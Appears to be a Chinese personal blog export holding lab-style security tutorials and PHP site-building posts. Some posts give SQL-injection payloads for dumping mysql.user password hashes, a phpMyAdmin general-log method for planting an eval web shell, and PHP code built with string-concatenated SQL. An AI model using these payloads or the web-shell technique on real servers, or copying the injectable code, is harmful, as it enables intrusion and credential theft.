{"meta":{"title":"baiQstar的博客","subtitle":"","description":"","author":"白易安","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"十六，sql注入的简单使用","slug":"十六，sql注入的简单使用","date":"2023-11-23T11:10:10.000Z","updated":"2023-11-23T12:12:29.815Z","comments":true,"path":"2023/11/23/十六，sql注入的简单使用/","permalink":"http://example.com/2023/11/23/%E5%8D%81%E5%85%AD%EF%BC%8Csql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/","excerpt":"","text":"1，搭建Pikachu漏洞练习平台先解压pikachu-master.zip文件至先前搭建的网站根目录，再打开pikachu\\inc目录下的config.inc.php 文件，并将第11行代码改为： 1define(&#x27;DBPW&#x27;, &#x27;root&#x27;); 保存后复制黏贴为config.inc文件 打开网址：http://192.168.2.31/pikachu/ 便可进入PIkachu漏洞联系平台 2，安装配置BurpSuite软件先解压BurpSuite v2.1中文版.zip，双击Start.vbs后在地址中输入cmd打开命令窗口输入： 1Java -jar burp-loader-keygen-2.jar 后按照流程完成BurpSuite软件 点击代理-&gt;选项-&gt;CA证明书再生成 打开网址：127.0.0.1:8080 点击CA Certificate下载证书文件cacert.der 在浏览器中点击设置-&gt;搜索证书-&gt;安全-&gt;管理证书-&gt;受信任的根证书颁发机构-&gt;导入证书即可 在GOogleChrome中的扩展插件SwitchyOmega中加入如下配置 3，使用BurpSuite在Pikachu漏洞练习平台进行数字型SQL注入先打开BurpSuite软件和Pikachu漏洞练习平台 再在Pikachu漏洞练习平台选择SQL的数字型注入选项 在BurpSuite软件中点击代理-&gt;截断-&gt;拦截禁用 选择1，点击查询，会发现页面没有跳转并在BurpSuite中显示了相关信息 右键发送给Repeater后管理关闭拦截请求后再重发器中可以看到相关信息，进行更改后可点击发送 数字型注入可以使用经典的 and 1&#x3D;1 和 and 1&#x3D;2 来判断： 在请求体最底下进行更改id&#x3D; 2 and 1&#x3D;1 页面依旧运行正常，继续进行下一步。 改为id&#x3D; 2 and 1&#x3D;2 页面运行错误，则说明此 Sql 注入为数字型注入。 改为id&#x3D;10 or 1 便可查询该表中的所有信息 因为在MySQL5.0以上会有一个information_schema数据库来记载所有数据库和表以及列的信息，所有可以针对该点进行查询 information_schema数据库结构如下： 在请求头输入： 1id=1 union select 1, (select schema_name from information_schema.schemata limit 0,1 )-- - 来查询有哪些数据库，查到有数据库名为mysql 1id=1 union select 1, (select table_name from information_schema.tables where table_name=&#x27;mysql&#x27; limit 0,1 )-- - 来查询mysql数据库中有那些表，其中有user表 1id=1 union select 1, (select column_name from information_schema.columns where table_name=&#x27;mysql&#x27; table_name=&#x27;user&#x27; limit 0,1 )-- - 来查询user表中有哪些字段，查询到了有User用户名和authentication_string密码字段 1id=1 union select 1, (select authentication_string from mysql.user where User=&#x27;root&#x27; limit 0,1 )-- - 可以查询到user表中的root管理员用户的密码 在MD5在线解密网站解密如下： 4，使用BurpSuite在Pikachu漏洞练习平台进行字符型SQL注入如数字型注入一样在BurpSuite中对网页的请求进行拦截 可以使用 and ‘1’&#x3D;’1 和 and ‘1’&#x3D;’2来判断： 在请求栏中更改id&#x3D; x’ and ‘1’&#x3D;’1 页面运行正常，继续进行下一步。 若id&#x3D; x’ and ‘1’&#x3D;’2 页面运行错误，则说明此 Sql 注入为字符型注入。 1name=sub&#x27;union select 1,database()-- - 可获取该数据库的名称 1name=sub&#x27; or &#x27;1=1&#x27;-- - 便可获取该表中的所有数据","categories":[],"tags":[]},{"title":"十五，通过phpmyadmin获取靶机的控制","slug":"十五，通过phpmyadmin获取靶机的控制","date":"2023-11-22T12:27:15.000Z","updated":"2023-11-22T12:50:29.098Z","comments":true,"path":"2023/11/22/十五，通过phpmyadmin获取靶机的控制/","permalink":"http://example.com/2023/11/22/%E5%8D%81%E4%BA%94%EF%BC%8C%E9%80%9A%E8%BF%87phpmyadmin%E8%8E%B7%E5%8F%96%E9%9D%B6%E6%9C%BA%E7%9A%84%E6%8E%A7%E5%88%B6/","excerpt":"","text":"通过phpMyAdmin获取靶机的控制，要满足以下三个条件：1，获取root权限2，获取网站的根目录绝对路径3，secure_file_priv为空 以下是获取控制的实现步骤：1，在小皮面板中下载phpMyAdmin 2，在浏览器中输入网址：（http://localhost/phpMyAdmin4.8.5/）进入管理页面 3，输入数据库的账号和密码进行登录 4，查看MySQL数据库服务器中系统变量（secure_file_priv）是否为Null 点击sql，输入命令 1show global variables like &#x27;%secure%&#x27; 5，开启全局日志记录，更改全局日志文件 输入： 1show variables like &#x27;%general%&#x27; 查看全局日志文件是否开启 OFF表示未打开，ON表示已开启 输入： 1set global general_log=ON 开启全局日志记录 显示成功后再次输入： 1show variables like &#x27;%general%&#x27; 查看全局日志 6，更改全局日志文件 在C:\\phpstudy_pro\\WWW(默认地址)的目录下新建一个空的php文件 将日志文件路径更改为刚刚新建的php文件目录 输入： 1set global general_log_file=&quot;C:/phpstudy_pro/WWW/phpmuma.php&quot; “&#x3D;”号后面的是你的新建php文件的路径 成功执行后再次输入： 1show variables like &#x27;%general%&#x27; 查看全局日志询看是否修改成功 7，关闭防火墙 8，在phpmuma文件里写入phpinfo 在输入 1SELECT &quot;&lt;? phpinfo(); ?&gt;&quot; 命令 在phpmuma文件里写入phpinfo 在phpmuma文件里看到这些 打开浏览器访问phpmuma文件 表示已成功写入phpinfo，可以在该页面下找到该网站根目录的绝对路径 9，使用一句话木马对网站进行植入 在phpMyAdmin里输入 1SELECT&quot; &lt;?php @eval($_POST[“cmd”]);?&gt;&quot; 10，下载并打开剑蚁进行配置 11，双击后出现如下界面则表示控制成功！","categories":[],"tags":[]},{"title":"十四，CentOS安装docker并使用","slug":"十四，CentOS安装docker并使用","date":"2023-11-21T11:13:15.000Z","updated":"2023-11-21T12:11:34.079Z","comments":true,"path":"2023/11/21/十四，CentOS安装docker并使用/","permalink":"http://example.com/2023/11/21/%E5%8D%81%E5%9B%9B%EF%BC%8CCentOS%E5%AE%89%E8%A3%85docker%E5%B9%B6%E4%BD%BF%E7%94%A8/","excerpt":"","text":"一，docker简介：​ Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。它可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。 ​ 容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。 ​ Docker将工程及此工程依赖的所有软件打包到一个容器中统一部署，可以解决在开发环境、测试环境以及生产环境等等。多种环境去部署同一份代码，由于环境原因往往会出现软件跨环境迁移的问题！ 二，介绍Docker中的三个概念镜像image ​ Docker 镜像（Image），就相当于是一个文件系统，是用于创建 Docker 容器的模板。也可以将镜像当作容器的“源代码”。镜像体积很小，非常“便携”，易于分享、存储和更新。 容器container ​ 容器是独立运行的一个或一组应用，是镜像运行时的实体。 注册中心(仓库)registry ​ Docker 仓库用来保存镜像，有点类似于Maven的远程仓库。Registry 分为公共和私有两种。Docker 公司运营公共的 Registry 叫做 Docker Hub。用户可以在 Docker Hub 注册账号，分享并保存自己的镜像（说明：在 Docker Hub 下载镜像巨慢，可以自己构建私有的 Registry）。 三，安装docker在安装docker之前，可以先做如下准备工作： 123456#1. 关闭防火墙，并禁止防火墙开机自启systemctl stop firewalldsystemctl disable firewalld#2. 关闭MySQL，并禁止MySQL开机自启（你的CentOS里之前安装过MySql，为防止端口冲突，需要做这一步）systemctl stop mysqldsystemctl disable mysqld 在联网环境下依次执行以下操作： 12345678910# 更新系统，如果需要确认，全部选 y (yes)。根据网络状况，此操作可能要花几分钟或者十几分钟时间yum update# 安装yum-utils工具和两个驱动依赖yum install -y yum-utils device-mapper-persistent-data lvm2# 设置使用阿里云的yum源，稍后会从阿里云下载docker软件yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo # 安装dockeryum install docker-ce# 查看docker版本docker -v 设置注册中心(仓库) 如果不设置注册中心，将从默认的docker hub里下载镜像，速度非常慢。 USTC（中科大的镜像服务）是老牌的Linux镜像服务提供者（注册中心Registry），从Ubuntu5.04版本就在使用。USTC的docker镜像速度加载很快，它的优势之一是不需要注册，是真正的公共服务。 设置步骤： 创建文件夹：mkdir &#x2F;etc&#x2F;docker 编辑文件daemon.json： vi &#x2F;etc&#x2F;docker&#x2F;daemon.json 1234&#123; &quot;registry-mirrors&quot;: [&quot;https://registry.docker-cn.com&quot;,&quot;https://pee6w651.mirror.aliyuncs.com&quot;], &quot;live-restore&quot;: true&#125; 保存并退出vi：按ESC，输:wq 回车 重新加载daemon文件，然后重启docker服务： 12systemctl daemon-reloadsystemctl restart docker 四，应用场景 docker镜像一旦构建，就已经一次性完成了应用自动打包、集成。docker镜像可以进行版本管理、复制、分享、修改，就像管理代码一样。 通过统一的docker环境封装（比如镜像中封装了同一版本的JDK、同样的环境变量等等），保证应用服务运行环境的一致性。避免出现在测试环境上好用，挪到生产环境下运行失败的问题。 docker可以做到秒级、甚至毫秒级的启动时间。大大的节约了开发、测试、部署的时间。因为镜像可下载、可复用，docker容器可快速启动等特性，结合容器编排服务(k8s)可以实现大型分布式部署的弹性伸缩，快速扩展。 五，Docker常用命令1，docker的启动，停止和重启 123systemctl start dockersystemctl stop dockersystemctl restart docker 2，查看docker的状态 1systemctl status docker 3，设置docker开机自启动 1systemctl enable docker 4查看docker的概要信息 1docker info 5，列出本地主机上有的镜像 12345678910docker images [OPTIONS]常用参数：-a ：列出所有的镜像 （含历史映像层）-q ：只显示镜像IDexample：docker images -adocker images -qdocker images -aqdocker images redis #查找镜像名为redis的镜像docker images redis:6.0.8 #查找镜像名:版本号(REPOSITORY：TAG)对应的镜像 字段解析： REPOSITORY：表示镜像的仓库源 TAG：镜像的标签版本号 IMAGE ID：镜像ID CREATED：镜像创建时间 SIZE：镜像大小 6，从远程库拉取镜像 1234docker pull 镜像名字[:TAG]example：docker pull redis:6.0.8docker pull ubuntu # 没有指定版本即拉取最新版 即默认为 ubuntu:latest 7，删除本地有的镜像 12345678#删除单个docker rmi 镜像ID #删除镜像，如果此时镜像上面有容器正在运行，会报错无法删除docker rmi -f 镜像ID #强制(forced)删除镜像#删除多个docker rmi -f 镜像名1:TAG 镜像名2:TAG #删除全部（慎用）docker rmi -f $(docker images -qa) #首先docker images -qa会列举本地所有的镜像的ID，然后作为一个集合送入rmi一个个删除 8，新建启动容器 1234567891011121314docker run [OPTIONS] IMAGE [COMMAND] [ARG...]常用参数：--name=NAME #为容器指定名字为NAME，不使用的话系统自动为容器命名-d: 后台运行容器并返回容器ID，也即启动守护式容器(后台运行)；-i：以交互模式运行容器，通常与 -t 同时使用；-t：为容器重新分配一个伪输入终端，通常与 -i 同时使用；也即启动交互式容器(前台有伪终端，等待交互，一般连用，即-it)；-P: 随机端口映射，大写P-p: 指定端口映射，小写p example：以ubuntu为例，启动后要交互先声明交互模式，其次交互得需要一个终端，因此参数为-itdocker run -it ubuntu /bin/bash指定名称docker run -it --name=myubuntu ubuntu /bin/bash 9，启动守护式容器 12345docker run -d 容器名 example：docker run -d redis:6.0.8docker run -d ubuntu 10，列出正在运行的容器 12345678910docker ps [OPTIONS]常用参数：-a :列出当前所有正在运行的容器+历史上运行过的-l :显示最近创建的容器。-n nu：显示最近nu个创建的容器。-q :静默模式，只显示容器编号。example：docker ps -aqdocker ps -n 3docker ps -l 11，进入正在运行的容器并以命令行交互 （1）docker exec -it 容器ID&#x2F;容器名称 bashShell （2）docker attach 容器ID 1234567example：#容器IDdocker exec -it c32f612cc218 /bin/bashdocker attach c32f612cc218#容器名称docker exec -it wizardly_booth /bin/bashdocker attach wizardly_booth 区别 ： ​ exec 是在容器中打开新的终端，并且可以启动新的进程。用exit退出，不会导致容器的停止，attach 直接进入容器启动命令的终端，不会启动新的进程。用exit退出，会导致容器的停止。推荐大家使用 docker exec 命令，因为退出容器终端，不会导致容器的停止。 12，启动，重启和停止容器 1234docker start 容器ID或者容器名docker restart 容器ID或者容器名docker stop 容器ID或者容器名docker kill 容器ID或容器名 # 强制停止容器 13，删除已停止的容器 1234567#删除一个docker rm 容器ID docker rm -f 容器ID #强制删除#删除多个docker rm -f $(docker ps -a -q)或docker ps -a -q | xargs docker rm 六，安装并启动phpmyadmin安装phpmyadmin 1docker pull phpmyadmin/phpmyadmin 启动MySQL和phpmyadmin服务 12345 docker inspect mysql57docker run --name mysql57 -v mysql57:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -p 3306:3306 -d mysql:5.7docker exec -it mysql57 bashdocker run --name phpmyadmin --link mysql57:db -p 9998:80 -d phpmyadmin/phpmyadmin 打开网址：192.168.0.44：9998进入phpmyadmin管理网站","categories":[],"tags":[]},{"title":"十三，CentOS搭建网站","slug":"十三，CentOS搭建网站","date":"2023-11-20T12:30:19.000Z","updated":"2023-11-20T12:34:02.880Z","comments":true,"path":"2023/11/20/十三，CentOS搭建网站/","permalink":"http://example.com/2023/11/20/%E5%8D%81%E4%B8%89%EF%BC%8CCentOS%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/","excerpt":"","text":"一、下载CentOS清华大学开源软件镜像：https://mirrors.tuna.tsinghua.edu.cn/，下载CentOS-vault 7.9.2版本–&gt;isos–&gt;x86_64 二、安装CentOS打开虚拟机，新建虚拟机，典型安装，设置安装路径，一直点击下一步，设置语言，网络配置开启，安装地址选择 然后设置root密码，等待加载 三、配置CentOS1.rm -f /var/run/yum.pid 清理睡眠状态 12345678910111213141516171819rm -f /var/run/yum.pidfirewall-cmd --permanent --zone=public --add-port=3306/tcpfirewall-cmd --permanent --zone=public --add-port=3306/udpfirewall-cmd --permanent --zone=public --add-port=80/tcpfirewall-cmd --permanent --zone=public --add-port=80/udpfirewall-cmd --reload #复制这几行代码到CentOS yum remove mariadb-libs.x86_64yum install httpd -ysystemctl enable httpdsystemctl restart httpdsystemctl status httpdyum -y install mariadb mariadb-serversystemctl enable mariadbsystemctl start mariadbmysql_secure_installation 2.开放防火墙 12345firewall-cmd --permanent --zone=public --add-port=3306/tcpfirewall-cmd --permanent --zone=public --add-port=3306/udpfirewall-cmd --permanent --zone=public --add-port=80/tcpfirewall-cmd --permanent --zone=public --add-port=80/udpfirewall-cmd --reload 3.关闭selinux 12vi /etc/selinux/config将SELINUX=enforcing这一行修改为SELINUX=disabled 4.reboot 5.删除默认数据库 12rpm -qa | grep mariadb 查找出默认数据库mariadb的包名。yum remove mariadb-libs.x86_64 删除 12345yum install httpd -ysystemctl enable httpdsystemctl restart httpdsystemctl status httpd //查看服务状态此时访问成功回显apache测试页，网站根目录/var/www/html 7.安装mysql 1234yum -y install mariadb mariadb-serversystemctl enable mariadbsystemctl start mariadbmysql_secure_installation 8.进行MySQL设置 1234567891011121314Enter current password for root (enter for none):&lt;–初次运行直接回车Set root password? [Y/n]&lt;– 是否设置root用户密码，输入y并回车或直接回车New password:&lt;– 设置root用户的密码Re-enter new password:&lt;– 再输入一次你设置的密码其他配置Remove anonymous users? [Y/n]&lt;– 是否删除匿名用户，回车Disallow root login remotely? [Y/n]&lt;–是否禁止root远程登录,回车,Remove test database and access to it? [Y/n]&lt;– 是否删除test数据库，回车Reload privilege tables now? [Y/n]&lt;– 是否重新加载权限表，回车初始化MariaDB完成，接下来测试登录mysql -uroot -p你的密码GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;你的密码的明文&#x27; WITH GRANT OPTION; FLUSH PRIVILEGES; 远程登陆完成。 9.php安装 12345 a. rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm b. yum -y remove php* c. yum -y install php72w php72w-cli php72w-fpm php72w-common php72w-devel php72w-embedded php72w-gd php72w-mbstring php72w-mysqlnd php72w-opcache php72w-pdo php72w-xml d. systemctl enable php-fpm.service systemctl start php-fpm.service 配置Apache解析php文件并自动关联 1234510. a. vi /etc/httpd/conf/httpd.conf b. 找到：DirectoryIndex index.html改为：DirectoryIndex index.html index.htm index.php c. 找到：AddType application/x-gzip .gz .tgz在该行下面添加：AddType application/x-httpd-php .php d. 重启Apache：systemctl restart httpd e. 在浏览器输入服务器IP地址或者绑定的域名访问即可，html文件下是网站主目录，如果是里面有个文件夹才是主目录可以在配置文件修改主目录路径，或者在IP地址访问后面加上文件夹名字。 四、移动php文件1.找到WWW文件夹，解压，然后就在这个目录下打开cmd输入scp -r .\\WWW.zip root@CentOSip地址:\\var\\www\\html\\，输入root密码 2.在CentOS中把刚才的WWW.zip解压到当前文件夹&#x2F;html 3.打开Navicat，创建新的MySql连接 用户名：root 密码为之前为MariaDB的密码，连接成功后把你需要的数据库复制到这里就可以。 数据库连接成功后就可以打开你的网站了。","categories":[],"tags":[]},{"title":"十二，网站问题修复","slug":"十二，网站问题修复","date":"2023-11-15T07:54:32.000Z","updated":"2023-11-15T08:10:34.210Z","comments":true,"path":"2023/11/15/十二，网站问题修复/","permalink":"http://example.com/2023/11/15/%E5%8D%81%E4%BA%8C%EF%BC%8C%E7%BD%91%E7%AB%99%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D/","excerpt":"","text":"​ 在之前的网站搭建中，网站还有一些问题会影响网站的使用，例如SQL注入和XSS攻击等，这篇文章讲述对这些问题的修复方案 1，之前的主页退出后再点击浏览器的回退见还可以返回主页面，原因是没有清除会话数据，解决代码如下： 1234567echo &#x27;&lt;h1&gt;&lt;a href=&quot;?logout=true&quot;&gt;注销&lt;/a&gt;&lt;/h1&gt;&#x27;;if (isset($_GET[&#x27;logout&#x27;])) &#123; // 清除会话数据 session_unset(); session_destroy(); echo &quot;您已成功注销。&lt;br&gt;&quot;;&#125; 2，在文件上传之后，很容易发现文件名和文件所处的位置，这样就很容易被植入木马，所以要对文件名称和位置进行加密处理，代码如下： 1234// 生成随机的文件名 $random_name = time().uniqid() . &#x27;_&#x27; . $file_name; // 移动文件到目标位置 $target_path = $upload_dir .&quot;\\\\&quot;. md5($random_name).$file_name; 3，在登录功能中简单的使用拼接的方式拼接变量很容易引发SQL注入的问题，可以用预编译语句来处理SQL语句再执行，但是一些场景不适用预编译，代码如下： 123456789// 使用预编译语句 $sql = &quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;; $stmt = mysqli_prepare($link, $sql); // 绑定参数 mysqli_stmt_bind_param($stmt, &quot;ss&quot;, $u, $p); // 执行查询 mysqli_stmt_execute($stmt); // 获取结果集 $result = mysqli_stmt_get_result($stmt); 4，在评论功能中也很容易发生SQL注入和XSS攻击，可以对获取的评论内容进行加密和转义来预防这些问题，代码如下： 123// 处理评论$comment = htmlspecialchars($_POST[&#x27;comment&#x27;]); // 防止 XSS 攻击$comment = mysqli_real_escape_string($link, $comment); // 转义评论，防止 SQL 注入","categories":[],"tags":[]},{"title":"十一，php搭建管理员页面","slug":"十一，php搭建管理员页面","date":"2023-11-15T07:30:36.000Z","updated":"2023-11-15T07:48:31.373Z","comments":true,"path":"2023/11/15/十一，php搭建管理员页面/","permalink":"http://example.com/2023/11/15/%E5%8D%81%E4%B8%80%EF%BC%8Cphp%E6%90%AD%E5%BB%BA%E7%AE%A1%E7%90%86%E5%91%98%E9%A1%B5%E9%9D%A2/","excerpt":"","text":"管理员页面分为三部分，分别是管理员信息展示块，users表中普通user信息块和信息管理块 1，管理员信息展示块 目前只展示了管理员的用户名和密码 代码如下： 123456789101112&lt;h3&gt; &lt;?php session_start(); if(isset($_COOKIE[user]))&#123; echo &quot;登录成功&lt;br&gt;&quot;; echo &quot;管理员名为：&quot;.$_SESSION[user].&quot; &lt;br&gt;&quot;; echo &quot;管理员密码为:&quot;.$_SESSION[pass].&quot;&lt;br&gt;&quot;; &#125;else&#123; echo &quot;失败！&quot;; &#125; ?&gt; &lt;/h3&gt; 效果如图所示： 2，users表中普通user信息块 从数据库中查询到信息在页面上以表格的形式分为n行3列，分别显示id.username,password的信息 代码如下： 12345678910111213141516171819202122232425262728&lt;table&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;id&lt;/th&gt; &lt;th&gt;用户名&lt;/th&gt; &lt;th&gt;密码&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;?php session_start(); $link=new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;); //从表中查询数据 $select=&quot;SELECT * FROM users &quot;; $result=$link-&gt;query($select); if ($result-&gt;num_rows &gt; 0) &#123; // 输出数据 while($row = $result-&gt;fetch_assoc()) &#123; if($row[&quot;isadm&quot;]==0)&#123; echo &quot;&lt;tr&gt;&lt;td&gt;&quot;. $row[&quot;id&quot;]. &quot;&lt;/td&gt;&lt;td&gt;&quot;. $row[&quot;username&quot;]. &quot;&lt;/td&gt;&lt;td&gt;&quot;. $row[&quot;password&quot;]. &quot;&lt;/td&gt;&lt;/tr&gt;&quot;; &#125; &#125; &#125; else &#123; echo &quot;&lt;tr&gt;&lt;td&gt;暂无用户数据！&lt;/td&gt;&lt;/tr&gt;&quot;; &#125; ?&gt; &lt;/tbody&gt; &lt;/table&gt; 效果如图所示： 3，信息管理块 连接数据库，用一个form表单完成对users表的增删改三个功能 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;form action=&quot;&quot; method=&quot;post&quot; class=&quot;login-form &quot;&gt; id: &lt;input type=&quot;text&quot; name=&quot;id&quot;&gt; username: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt; passwword: &lt;input type=&quot;text&quot; name=&quot;pass&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;adduser&quot; value=&quot;添加用户&quot; class=&quot;com&quot; &gt; &lt;input type=&quot;submit&quot; name=&quot;upduser&quot; value=&quot;修改用户&quot; class=&quot;com&quot; &gt; &lt;input type=&quot;submit&quot; name=&quot;deluser&quot; value=&quot;删除用户&quot; class=&quot;com&quot; &gt; &lt;?php $uid=trim($_POST[&quot;id&quot;]); $uname=trim($_POST[&quot;name&quot;]); $upass=trim($_POST[&quot;pass&quot;]); if(isset($_POST[&quot;adduser&quot;]))&#123; if(empty($uname) || empty($upass))&#123; echo &#x27;用户名或密码不能为空！&#x27;; exit(); &#125;else&#123; $insert=&quot;INSERT INTO users (username,password,isadm) VALUES (&#x27;$uname&#x27;,&#x27;$upass&#x27;,0)&quot;; $result1=$link-&gt;query($insert); if($result1===true)&#123; echo &quot;添加用户成功!&quot;; //header(&quot;Location: admin.php&quot;); &#125;else&#123; echo $insert .&quot;&lt;br&gt;&quot;; echo &quot;添加用户失败！&lt;br&gt;&quot;; &#125; &#125; &#125;else if(isset($_POST[&quot;upduser&quot;]))&#123; if(empty($uid))&#123; echo &#x27;用户id不能为空!&#x27;; exit(); &#125;else if(empty($uname) || empty($upass))&#123; echo &#x27;用户名或密码不能为空！&#x27;; exit(); &#125;else&#123; $update=&quot;UPDATE users SET username = &#x27;$uname&#x27;, password = &#x27;$upass&#x27; WHERE id = $uid&quot;; $result2=$link-&gt;query($update); if($result2===true)&#123; echo &quot;更新用户成功！&lt;br&gt;&quot;; //sleep(5); //header(&quot;Location: admin.php&quot;); &#125;else&#123; echo $update .&quot;&lt;br&gt;&quot;; echo &quot;更新用户失败！&lt;br&gt;&quot;; &#125; &#125; &#125;else if(isset($_POST[&quot;deluser&quot;]))&#123; if(empty($uid))&#123; echo &#x27;用户id不能为空!&#x27;; exit(); &#125;else&#123; $delete=&quot;DELETE FROM users WHERE id = $uid&quot;; $result3=$link-&gt;query($delete); if($result3===true)&#123; echo &quot;删除用户成功！&quot;; //sleep(5); //header(&quot;Location: admin.php&quot;); &#125;else&#123; echo $delete .&quot;&lt;br&gt;&quot;; echo &quot;删除用户失败！&lt;br&gt;&quot;; &#125; &#125; &#125; ?&gt; &lt;/form&gt; 效果如图所示： 4，用html和css将三个&lt;div组件&gt;平分页面为三部分并按照从左到右排列 代码如下： 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;三等分页面&lt;/title&gt; &lt;style&gt; .container &#123; display: flex; width: 100%; height: 100vh; &#125; .box &#123; flex: 1; height: 100%; display: flex; justify-content: center; align-items: center; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;box&quot; style=&quot;background-color: red;&quot;&gt;1&lt;/div&gt; &lt;div class=&quot;box&quot; style=&quot;background-color: green;&quot;&gt;2&lt;/div&gt; &lt;div class=&quot;box&quot; style=&quot;background-color: blue;&quot;&gt;3&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 效果如图所示：","categories":[],"tags":[]},{"title":"十，php搭建主页面功能","slug":"十，php搭建主页面功能","date":"2023-11-15T04:19:34.000Z","updated":"2023-11-15T04:49:36.313Z","comments":true,"path":"2023/11/15/十，php搭建主页面功能/","permalink":"http://example.com/2023/11/15/%E5%8D%81%EF%BC%8Cphp%E6%90%AD%E5%BB%BA%E4%B8%BB%E9%A1%B5%E9%9D%A2%E5%8A%9F%E8%83%BD/","excerpt":"","text":"1，登录页面有SQL注入漏洞查询数据库名称 在用户名输入框输入：0’ union select 1,database(),3– - 2，登录页面有SQL注入罗东查询uses表中的所有数据 在用户名输入框输入：0’ union select 1,database(),(group_concat(id,username,password)) from security.users– - 3，新建upload.php文件，编写文件上传功能 代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .ft&#123; margin-left: 10%; &#125; .com&#123; background-color: #00BFFF; border: 2px solid white; border-radius: 10px; width: 100px; height: 40px; color: white; text-align: center; line-height: 40px; font-size: 20px; margin-bottom: 10px; margin-top:20px &#125; .com:active&#123; transform: translateY(2px); &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;ft&quot;&gt; &lt;h2&gt;文件上传&lt;/h2&gt; &lt;form method=&quot;post&quot; action=&quot;&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; &gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;com&quot; value=&quot;点击上传&quot;&gt;&lt;br&gt; &lt;h3&gt;下面是接收到的文件：&lt;h3&gt; &lt;/form&gt; &lt;?php if(isset($_FILES[&#x27;file&#x27;]))&#123; $upload_dir=&quot;upload&quot;; $name=$_FILES[&quot;file&quot;][&quot;name&quot;]; $type=$_FILES[&quot;file&quot;][&quot;type&quot;]; $size=$_FILES[&quot;file&quot;][&quot;size&quot;]; $tmp_name=$_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $radmon_name=$name; $target_path=$upload_dir.&quot;//&quot;.$radmon_name; if(move_uploaded_file($tmp_name,$target_path))&#123; echo &quot;上传成功！&lt;br&gt;&quot;; echo &quot;文件名称：&quot; .$radmon_name .&quot;&lt;br&gt;&quot;; echo &quot;文件大小:&quot; .($size/1024) .&quot;KB&lt;br&gt;&quot;; echo &quot;文件类型:&quot; .$type .&quot;&lt;br&gt;&quot;; echo &quot;文件地址:&quot; .$target_path .&quot;&lt;br&gt;&quot;; &#125;else&#123; echo &quot;上传失败！&quot;; &#125; &#125; ?&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 效果如下： 4，新建mycomments.php文件，编写评论功能 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;我的评论&lt;/title&gt; &lt;style&gt; .form1&#123; margin-left: 10%; margin-top: 20px; &#125; .ft&#123; margin-left: 10%; &#125; .com&#123; background-color: #00BFFF; border: 2px solid white; border-radius: 10px; width: 100px; height: 40px; color: white; text-align: center; line-height: 40px; font-size: 20px; margin-bottom: 10px; margin-top:20px &#125; .com:active&#123; transform: translateY(2px); &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;form method=&quot;post&quot; action=&quot;&quot; class=&quot;form1&quot;&gt; &lt;h3 &gt;发表评论：&lt;/h3&gt;&lt;br&gt; &lt;textarea id=&quot;input&quot; name=&quot;comment&quot; rows=&quot;4&quot; cols=&quot;50&quot; &gt;&lt;/textarea&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;post_com&quot; value=&quot;提交评论&quot; class=&quot;com&quot; &gt; &lt;/form&gt; &lt;?php session_start(); $link=new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;); // 检查连接是否成功 if ($conn-&gt;connect_error) &#123; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;数据库连接失败!&lt;/div&gt;&lt;br&gt;&quot;; &#125;else&#123; echo &quot;&lt;div class=&#x27;ft&#x27;&gt;数据库连接成功！&lt;/div&gt;&lt;br&gt;&quot;; &#125; $comment=trim($_POST[&#x27;comment&#x27;]); echo &quot;&lt;div class=&#x27;ft&#x27;&gt; &quot; . $comment .&quot;&lt;/div&gt;&lt;br&gt;&quot;; //向表中插入数据 if(isset($_POST[&#x27;post_com&#x27;]))&#123; 